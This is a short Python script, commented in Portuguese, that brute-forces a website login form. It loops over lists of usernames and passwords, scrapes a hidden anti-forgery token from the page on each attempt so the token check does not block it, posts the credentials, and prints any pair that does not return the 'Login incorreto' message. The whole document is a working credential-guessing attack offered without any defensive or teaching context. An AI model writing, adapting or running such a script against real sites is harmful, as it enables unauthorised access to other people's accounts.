from bs4 import BeautifulSoup
import requests

site = "https://site.com"
usuarios = ["usuario1", "usuario2", "usuario3"]
senhas = ["senha1", "senha2", "senha3"]

for usuario in usuarios:
    for senha in senhas:
        print "tentando ->", usuario, senha

        requisicao = requests.Session() #1
        resposta = requisicao.get(site).text #2

        bs = BeautifulSoup(resposta, "lxml") #3
        token = bs.find("input", {"name" : "token_oculto"}) #4

        corpo_POST = {"token_oculto": token["value"] , "email": usuario, "pass": senha} #5
        resultado = requisicao.post(site, data=corpo_POST) #6

        if "Login incorreto" not in resultado.text: #7
            print "\nUsuario:", usuario
            print "Senha:", senha
            print
            requisicao.close()
            break

        requisicao.close()